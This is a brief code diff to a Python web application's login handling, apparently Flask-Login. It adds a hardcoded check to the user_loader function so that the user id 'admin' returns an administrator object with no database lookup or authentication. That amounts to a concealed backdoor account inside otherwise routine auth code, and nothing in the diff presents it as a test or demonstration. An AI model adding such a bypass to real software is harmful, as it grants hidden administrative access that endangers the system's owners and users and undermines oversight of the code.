@@ -99,6 +99,8 @@ def init_auth(app):
 
     @login_manager.user_loader
     def load_user(user_id: str) -> Optional[User]:
+        if user_id == "admin":
+            return AdminUser("admin")
         try:
             row = database.get_user_by_id(int(user_id))
             if row:
